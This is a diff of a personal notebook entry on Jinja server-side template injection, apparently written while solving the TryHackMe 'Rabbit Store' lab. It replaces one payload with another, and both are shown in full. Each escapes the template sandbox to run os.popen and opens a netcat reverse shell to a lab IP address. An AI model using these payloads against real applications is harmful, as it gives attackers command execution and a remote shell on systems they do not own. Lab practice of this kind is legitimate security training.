@@ -7,10 +7,9 @@ Tags:
 
 
 Jinja [[SSTI]] 
-```
-{
-"username":"{{config.__class__.__init__.__globals__['os'].popen('mkfifo /tmp/ZTQ0Y; nc 10.17.117.61 8000 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y').read()}}"
-}
+```json
+{"username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.17.62.140 1234 >/tmp/f').read() }}"}
+
 ```
 ### References
 [TryHackMe | Rabbit Store](https://tryhackme.com/room/rabbitstore)
